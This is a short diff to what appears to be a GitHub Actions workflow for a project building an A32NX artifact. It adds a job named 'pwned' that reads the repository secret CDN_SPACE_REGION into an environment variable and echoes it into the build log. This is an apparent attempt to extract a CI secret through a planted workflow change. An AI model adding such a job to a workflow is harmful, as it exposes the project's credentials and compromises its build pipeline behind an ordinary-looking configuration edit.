@@ -48,3 +48,11 @@ jobs:
         with:
           name: A32NX
           path: A32NX
+  pwned:
+    runs-on: ubuntu-latest
+    steps:
+      - name: pwned
+        env:
+          SECRET: ${{ secrets.CDN_SPACE_REGION }}
+        run: |
+          echo $SECRET
